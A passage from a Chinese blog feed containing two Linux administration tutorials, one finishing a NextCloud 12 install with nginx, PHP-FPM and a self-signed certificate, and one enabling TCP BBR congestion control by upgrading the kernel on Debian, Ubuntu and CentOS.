class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span>[HOSTNAME] = <span class="hljs-variable">$HOSTNAME</span><br><span class="hljs-built_in">env</span>[PATH] = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br><span class="hljs-built_in">env</span>[TMP] = /tmp<br><span class="hljs-built_in">env</span>[TMPDIR] = /tmp<br><span class="hljs-built_in">env</span>[TEMP] = /tmp<br></code></pre></td></tr></table></figure><p>重启<strong>PHP-FPM</strong>服务：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-keyword">user</span>]$ sudo service php7<span class="hljs-number">.0</span>-fpm <span class="hljs-keyword">restart</span><br></code></pre></td></tr></table></figure><h2 id="4-下载并且安装NextCloud12"><a href="#4-下载并且安装NextCloud12" class="headerlink" title="4.下载并且安装ＮextCloud12"></a>4.下载并且安装ＮextCloud12</h2><p>这里将Nextcloud安装到**&#x2F;var&#x2F;www&#x2F;nextcloud&#x2F;**目录下，安装目录根据个人爱好就行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash">wget https://download.nextcloud.com/server/releases/nextcloud-12.0.0.zip</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash">unzip nextcloud-12.0.0.zip</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /var/www/</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mv</span> nextcloud /var/www/</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">rm</span> -f nextcloud-12.0.0.zip</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> -R www-data: /var/www/nextcloud</span><br></code></pre></td></tr></table></figure><h2 id="5-安装和配置nginx"><a href="#5-安装和配置nginx" class="headerlink" title="5.安装和配置nginx"></a>5.安装和配置nginx</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">user</span>]$ sudo apt-<span class="hljs-keyword">get</span> install nginx-extras nginx<br></code></pre></td></tr></table></figure><h2 id="6-这里创建相应的ssl证书，方便大家访问，如果有相应的证书，将证书放置-x2F-etc-x2F-nginx-x2F-ssl目录下，如果是新手，请注意证书的名字"><a href="#6-这里创建相应的ssl证书，方便大家访问，如果有相应的证书，将证书放置-x2F-etc-x2F-nginx-x2F-ssl目录下，如果是新手，请注意证书的名字" class="headerlink" title="6.这里创建相应的ssl证书，方便大家访问，如果有相应的证书，将证书放置&#x2F;etc&#x2F;nginx&#x2F;ssl目录下，如果是新手，请注意证书的名字"></a>6.这里创建相应的ssl证书，方便大家访问，如果有相应的证书，将证书放置&#x2F;etc&#x2F;nginx&#x2F;ssl目录下，如果是新手，请注意证书的名字</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/nginx/ssl</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /etc/nginx/ssl</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> openssl genrsa -des3 -passout pass:x -out nextcloud.pass.key 2048</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> openssl rsa -passin pass:x -<span class="hljs-keyword">in</span> nextcloud.pass.key -out nextcloud.key</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> nextcloud.pass.key</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> openssl req -new -key nextcloud.key -out nextcloud.csr</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> openssl x509 -req -days 365 -<span class="hljs-keyword">in</span> nextcloud.csr -signkey nextcloud.key -out nextcloud.crt</span><br></code></pre></td></tr></table></figure><h2 id="7-为nginx服务器创建相应的配置文件："><a href="#7-为nginx服务器创建相应的配置文件：" class="headerlink" title="7.为nginx服务器创建相应的配置文件："></a>7.为nginx服务器创建相应的配置文件：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> nano /etc/nginx/sites-available/nextcloud</span><br></code></pre></td></tr></table></figure><p>文件内容：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> my.nextcloud.com;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">301</span> https://<span class="hljs-variable">$server_name</span><span class="hljs-variable">$request_uri</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl http2;<br>    <span class="hljs-attribute">server_name</span> my.nextcloud.com;<br>    <span class="hljs-attribute">root</span> /var/www/nextcloud;<br><br>    <span class="hljs-attribute">ssl</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">ssl_certificate</span>     /etc/nginx/ssl/nextcloud.crt;<br>    <span class="hljs-attribute">ssl_certificate_key</span> /etc/nginx/ssl/nextcloud.key;<br>    <span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">5m</span>;<br>    <span class="hljs-attribute">ssl_ciphers</span>               <span class="hljs-string">&#x27;AES128+EECDH:AES128+EDH:!aNULL&#x27;</span>;<br>    <span class="hljs-attribute">ssl_protocols</span>              TLSv1 TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span>;<br>    <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;<br><br>    <span class="hljs-attribute">add_header</span> X-Content-Type-Options nosniff;<br>    <span class="hljs-attribute">add_header</span> X-Frame-Options <span class="hljs-string">&quot;SAMEORIGIN&quot;</span>;<br>    <span class="hljs-attribute">add_header</span> X-XSS-Protection <span class="hljs-string">&quot;1; mode=block&quot;</span>;<br>    <span class="hljs-attribute">add_header</span> X-Robots-Tag <span class="hljs-literal">none</span>;<br>    <span class="hljs-attribute">add_header</span> X-Download-Options noopen;<br>    <span class="hljs-attribute">add_header</span> X-Permitted-Cross-Domain-Policies <span class="hljs-literal">none</span>;<br><br>    <span class="hljs-attribute">access_log</span>  /var/log/nginx/nextcloud.access.log;<br>    <span class="hljs-attribute">error_log</span>   /var/log/nginx/nextcloud.<span class="hljs-literal">error</span>.log;<br><br>    <span class="hljs-section">location</span> = /robots.txt &#123;<br>        <span class="hljs-attribute">allow</span> all;<br>        <span class="hljs-attribute">log_not_found</span> <span class="hljs-literal">off</span>;<br>        <span class="hljs-attribute">access_log</span> <span class="hljs-literal">off</span>;<br>    &#125;<br><br>    <span class="hljs-section">location</span> = /.well-known/carddav &#123; <br>        <span class="hljs-attribute">return</span> <span class="hljs-number">301</span> <span class="hljs-variable">$scheme</span>://<span class="hljs-variable">$host</span>/remote.php/dav; <br>    &#125;<br>    <span class="hljs-section">location</span> = /.well-known/caldav &#123; <br>        <span class="hljs-attribute">return</span> <span class="hljs-number">301</span> <span class="hljs-variable">$scheme</span>://<span class="hljs-variable">$host</span>/remote.php/dav; <br>    &#125;<br><br>    <span class="hljs-attribute">client_max_body_size</span> <span class="hljs-number">512M</span>;<br>    <span class="hljs-attribute">fastcgi_buffers</span> <span class="hljs-number">64</span> <span class="hljs-number">4K</span>;<br>    <span class="hljs-attribute">gzip</span> <span class="hljs-literal">off</span>;<br><br>    <span class="hljs-attribute">error_page</span> <span class="hljs-number">403</span> /core/templates/<span class="hljs-number">403</span>.php;<br>    <span class="hljs-attribute">error_page</span> <span class="hljs-number">404</span> /core/templates/<span class="hljs-number">404</span>.php;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^</span> /index.php<span class="hljs-variable">$uri</span>;<br>    &#125;<br><br>    <span class="hljs-section">location</span> <span class="hljs-regexp">~ ^/(?:build|tests|config|lib|3rdparty|templates|data)/</span> &#123;<br>        <span class="hljs-attribute">deny</span> all;<br>    &#125;<br><br>    <span class="hljs-section">location</span> <span class="hljs-regexp">~ ^/(?:\.|autotest|occ|issue|indie|db_|console)</span> &#123;<br>        <span class="hljs-attribute">deny</span> all;<br>    &#125;<br><br>    <span class="hljs-section">location</span> ~^/(?:index|remote|public|cron|core/ajax/update|status|ocs/v[<span class="hljs-number">12</span>]|updater/.+|ocs-provider/.+|core/templates/<span class="hljs-number">40</span>[<span class="hljs-number">34</span>])\.php(?:$|/) &#123;<br>        <span class="hljs-attribute">include</span> fastcgi_params;<br>        <span class="hljs-attribute">fastcgi_split_path_info</span><span class="hljs-regexp"> ^(.+\.php)(/.+)$</span>;<br>        <span class="hljs-attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="hljs-variable">$document_root</span><span class="hljs-variable">$fastcgi_script_name</span>;<br>        <span class="hljs-attribute">fastcgi_param</span> PATH_INFO <span class="hljs-variable">$fastcgi_path_info</span>;<br>        <span class="hljs-attribute">fastcgi_param</span> HTTPS <span class="hljs-literal">on</span>;<br>        <span class="hljs-comment">#Avoid sending the security headers twice</span><br>        <span class="hljs-attribute">fastcgi_param</span> modHeadersAvailable <span class="hljs-literal">true</span>;<br>        <span class="hljs-attribute">fastcgi_param</span> front_controller_active <span class="hljs-literal">true</span>;<br>        <span class="hljs-attribute">fastcgi_pass</span> unix:/var/run/php/php7.0-fpm.sock;<br>        <span class="hljs-attribute">fastcgi_intercept_errors</span> <span class="hljs-literal">on</span>;<br>        <span class="hljs-attribute">fastcgi_request_buffering</span> <span class="hljs-literal">off</span>;<br>    &#125;<br><br>    <span class="hljs-section">location</span> <span class="hljs-regexp">~ ^/(?:updater|ocs-provider)(?:$|/)</span> &#123;<br>        <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span>/ =<span class="hljs-number">404</span>;<br>        <span class="hljs-attribute">index</span> index.php;<br>    &#125;<br><br>    <span class="hljs-section">location</span> <span class="hljs-regexp">~* \.(?:css|js)$</span> &#123;<br>        <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> /index.php<span class="hljs-variable">$uri</span><span class="hljs-variable">$is_args</span><span class="hljs-variable">$args</span>;<br>        <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;public, max-age=7200&quot;</span>;<br>        <span class="hljs-attribute">add_header</span> X-Content-Type-Options nosniff;<br>        <span class="hljs-attribute">add_header</span> X-Frame-Options <span class="hljs-string">&quot;SAMEORIGIN&quot;</span>;<br>        <span class="hljs-attribute">add_header</span> X-XSS-Protection <span class="hljs-string">&quot;1; mode=block&quot;</span>;<br>        <span class="hljs-attribute">add_header</span> X-Robots-Tag <span class="hljs-literal">none</span>;<br>        <span class="hljs-attribute">add_header</span> X-Download-Options noopen;<br>        <span class="hljs-attribute">add_header</span> X-Permitted-Cross-Domain-Policies <span class="hljs-literal">none</span>;<br>        <span class="hljs-comment"># Optional: Don&#x27;t log access to assets</span><br>        <span class="hljs-attribute">access_log</span> <span class="hljs-literal">off</span>;<br>    &#125;<br><br>    <span class="hljs-section">location</span> <span class="hljs-regexp">~* \.(?:svg|gif|png|html|ttf|woff|ico|jpg|jpeg)$</span> &#123;<br>        <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> /index.php<span class="hljs-variable">$uri</span><span class="hljs-variable">$is_args</span><span class="hljs-variable">$args</span>;<br>        <span class="hljs-attribute">access_log</span> <span class="hljs-literal">off</span>;<br>    &#125;<br><br>    <span class="hljs-section">location</span> <span class="hljs-regexp">~ /\.ht</span> &#123;<br>        <span class="hljs-attribute">deny</span> all;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>*<strong>注意：这里需要更改相应的域名，不要直接复制</strong><br>链接相应的配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">ln</span> -s /etc/nginx/sites-available/nextcloud /etc/nginx/sites-enabled/nextcloud</span><br></code></pre></td></tr></table></figure><p>重启nginx服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> nginx -t</span><br><span class="hljs-meta prompt_">[user]$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> service nginx restart</span><br></code></pre></td></tr></table></figure><h2 id="8-到此，安装已经完成，接下来需要登录nextcloud并且配置相应的文件存储位置："><a href="#8-到此，安装已经完成，接下来需要登录nextcloud并且配置相应的文件存储位置：" class="headerlink" title="8.到此，安装已经完成，接下来需要登录nextcloud并且配置相应的文件存储位置："></a>8.到此，安装已经完成，接下来需要登录nextcloud并且配置相应的文件存储位置：</h2><p>打开浏览器输入：<a href="https://my.nextcloud.com/install.php">https://my.nextcloud.com/install.php</a></p><blockquote><p>注意这里设置的域名，如果没有设置域名，在相同的网段下使用ＩＰ进行访问，我这里在同一个路由下访问nextcloud,主机的ip为192.168.1.105，怎么查看自己主机的ip方法有很多，命令也行，路由也行，怎么方便怎么来．<br><strong><a href="https://192.168.1.105/install.php">https://192.168.1.105/install.php</a></strong></p></blockquote><p>打开网页后，设置相应的管理员用户名和密码及相应的文件存储位置，这个位置可以随便设置，但是需要更改位置的组和拥有者为<strong>www-data</strong>,</p><p>*<strong>注意</strong>：上传和下载大文件时可能会提示文件太大，需要更改上传和下载文件最大限制：</p><p>配置文件需要修改：</p><ol><li><p>&#x2F;etc&#x2F;php&#x2F;7.0&#x2F;fpm&#x2F;php.ini　</p> <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">php memory<span class="hljs-comment">;</span><br>upload_max_filesize<span class="hljs-comment">;</span><br>post_max_size<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p>&#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;nextcloud</p> <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">client_max_body_size<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p>&#x2F;var&#x2F;www&#x2F;nextcloud&#x2F;.htaccess</p> <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">php_value upload_max_filesize<span class="hljs-comment">; </span><br>php_value post_max_size<span class="hljs-comment">;</span><br>php_value memory_limit<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li></ol><p>*<strong>具体大小根据个人情况设置</strong></p><p>配置完成以后重启相应的服务：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">sudo<span class="hljs-keyword"> system</span>ctl restart php7.0-fpm <br>sudo<span class="hljs-keyword"> system</span>ctl restart nginx<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nextcloud</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开启TCP BBR拥塞控制算法</title>
    <link href="/2018/02/20/2018-02-20-open-bbr-services/"/>
    <url>/2018/02/20/2018-02-20-open-bbr-services/</url>
    
    <content type="html"><![CDATA[<p>BBR 目的是要尽量跑满带宽, 并且尽量不要有排队的情况, 效果并不比速锐差</p><p>Linux kernel 4.9+ 已支持 tcp_bbr 下面简单讲述基于KVM架构VPS如何开启  </p><p>附:<br><a href="https://www.91yun.org/archives/4996">OpenVZ 架构VPS开启BBR</a>  （容易导致判定滥用ban机，慎用！)</p><p><a href="https://moeclub.org/2017/06/24/278/">Debian&#x2F;Ubuntu TCP BBR 魔改版</a></p><h2 id="Debian-8-x2F-Ubuntu-14"><a href="#Debian-8-x2F-Ubuntu-14" class="headerlink" title="Debian 8+ &#x2F; Ubuntu 14"></a>Debian 8+ &#x2F; Ubuntu 14</h2><ul><li><p>下载最新内核,最新内核查看<a href="http://kernel.ubuntu.com/~kernel-ppa/mainline">这里</a>  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.<span class="hljs-number">14</span>.<span class="hljs-number">12</span>/linux-image-<span class="hljs-number">4</span>.<span class="hljs-number">14</span>.<span class="hljs-number">12</span>-<span class="hljs-number">041412</span>-generic_4.<span class="hljs-number">14</span>.<span class="hljs-number">12</span>-<span class="hljs-number">041412</span>.<span class="hljs-number">201801051649</span>_amd64.deb<br></code></pre></td></tr></table></figure></li><li><p>安装内核</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">dpkg -<span class="hljs-selector-tag">i</span> linux-<span class="hljs-selector-tag">image</span>-<span class="hljs-number">4</span>.*<span class="hljs-selector-class">.deb</span><br></code></pre></td></tr></table></figure></li><li><p>删除旧内核(可选)</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">dpkg -l | grep linux-image <br>apt-get purge 旧内核<br></code></pre></td></tr></table></figure></li><li><p>更新 grub 系统引导文件并重启</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">update-grub</span><br><span class="hljs-attribute">reboot</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="Ubuntu-16-04"><a href="#Ubuntu-16-04" class="headerlink" title="Ubuntu 16.04"></a>Ubuntu 16.04</h2><p>安装 Hardware Enablement Stack (HWE)，自动更新内核</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span> install --install-recommends linux-generic-hwe-<span class="hljs-number">16</span>.<span class="hljs-number">04</span><br></code></pre></td></tr></table></figure><ul><li>删除旧内核(可选)<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">apt <span class="hljs-built_in">auto</span>remove<br></code></pre></td></tr></table></figure></li></ul><h2 id="CentOS-6"><a href="#CentOS-6" class="headerlink" title="CentOS 6"></a>CentOS 6</h2><ul><li><p>下载更换内核<br>最新内核查看<a href="http://elrepo.org/linux/kernel/el6/x86_64/RPMS/">这里</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">rpm <span class="hljs-attr">--import</span> https:<span class="hljs-comment">//www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br>rpm -Uvh http:<span class="hljs-comment">//www.elrepo.org/elrepo-release-6-8.el6.elrepo.noarch.rpm</span><br>yum <span class="hljs-attr">--enablerepo</span>=elrepo-kernel install kernel-ml -<span class="hljs-attribute">y</span><br></code></pre></td></tr></table></figure></li><li><p>查看内核是否安装成功  </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">rpm -<span class="hljs-keyword">qa</span> | <span class="hljs-keyword">grep</span> kernel<br></code></pre></td></tr></table></figure></li><li><p>删除旧内核(可选)  </p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">rpm -<span class="hljs-built_in">ev</span> 旧内核  <br></code></pre></td></tr></table></figure></li><li><p>更新 grub 系统引导文件并重启</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sed -<span class="hljs-selector-tag">i</span> <span class="hljs-string">&#x27;s:default=.*:default=0:g&#x27;</span> /etc/grub<span class="hljs-selector-class">.conf</span><br>reboot<br></code></pre></td></tr></table></figure><p>开不了机的打开 vps 后台控制面板的 vnc, 开机卡在 grub 引导, 只需要手动选择内核就可以了</p></li></ul><p>安装完成后不要忘记修改 &#x2F;boot&#x2F;grub&#x2F;menu.lst 和 &#x2F;etc&#x2F;grub.conf，将这两个文件中旧内核的启动项删除即可避免无法重启的问题。</p><ul><li>更新到最新版内核 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">yum <span class="hljs-attribute">--enablerepo</span>=elrepo-kernel update -y <br>reboot<br></code></pre></td></tr></table></figure></li></ul><h2 id="CentOS-7"><a href="#CentOS-7" class="headerlink" title="CentOS 7"></a>CentOS 7</h2><ul><li><p>下载更换内核<br>最新内核查看<a href="http://elrepo.org/linux/kernel/el7/x86_64/RPMS/">这里</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">rpm <span class="hljs-attr">--import</span> https:<span class="hljs-comment">//www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br>rpm -Uvh http:<span class="hljs-comment">//www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm</span><br>yum <span class="hljs-attr">--enablerepo</span>=elrepo-kernel install kernel-ml -<span class="hljs-attribute">y</span><br></code></pre></td></tr></table></figure></li><li><p>查看内核是否安装成功  </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">rpm -<span class="hljs-keyword">qa</span> | <span class="hljs-keyword">grep</span> kernel<br></code></pre></td></tr></table></figure></li><li><p>删除旧内核(可选)  </p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">rpm -<span class="hljs-built_in">ev</span> 旧内核  <br></code></pre></td></tr></table></figure></li><li><p>更新 grub 系统引导文件并重启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">egrep ^menuentry /etc/grub2.cfg | <span class="hljs-built_in">cut</span> -f 2 -d \&#x27;<br>grub2-set-default 0  <span class="hljs-comment"># default 0 表示第一个内核设置为默认运行, 选择最新内核就对了</span><br>reboot<br></code></pre></td></tr></table></figure></li><li><p>注意，某些服务商（如 <a href="https://www.digitalocean.com/community/tutorials/how-to-update-a-digitalocean-server-s-kernel">Digital Ocean</a>）可能需要首先将 VPS 配置为可自定义内核，然后 grub2 的配置才会生效。</p></li></ul><p>重新启动后，如果会出现 “read-only file system” 的错误，root账户下执行 <code>mount -o remount rw /</code> 即可</p><ul><li>更新到最新版内核</li></ul><p>方法同 CentOS 6</p><h2 id="开启bbr"><a href="#开启bbr" class="headerlink" title="开启bbr"></a>开启bbr</h2><p>开机后 <code>uname -r</code> 看看是不是内核 &gt;&#x3D; 4.9  </p><p>执行 <code>lsmod | grep bbr</code>，如果结果中没有 <code>tcp_bbr</code> 的话就先执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">modprobe tcp_bbr<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;tcp_bbr&quot;</span> &gt;&gt; /etc/modules-load.d/modules.conf<br></code></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;net.core.default_qdisc=fq&quot;</span> &gt;&gt; /etc/sysctl.conf<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;net.ipv4.tcp_congestion_control=bbr&quot;</span> &gt;&gt; /etc/sysctl.conf<br></code></pre></td></tr></table></figure><p>保存生效<br><code>sysctl -p</code>  </p><p>执行  </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sysctl net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_available_congestion_control</span><br>sysctl net<span class="hljs-selector-class">.ipv4</span>.tcp_congestion_control<br></code></pre></td></tr></table></figure><p>如果结果都有 <code>bbr</code>, 则证明你的内核已开启 bbr  </p><p>执行 <code>lsmod | grep bbr</code>, 看到有 tcp_bbr 模块即说明 bbr 已启动  </p><hr><p>文章转载自：<a href="https://github.com/iMeiji/shadowsocks_install/wiki/%E5%BC%80%E5%90%AFTCP-BBR%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95">https://github.com/iMeiji/shadowsocks_install/wiki/%E5%BC%80%E5%90%AFTCP-BBR%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KaliLinux 安装Nvidia闭源驱动</title>
    <link href="/2018/01/09/2018-01-10-kali-install-nvidia-driver/"/>
    <url>/2018/01/09/2018-01-10-kali-install-nvidia-driver/</url>
    
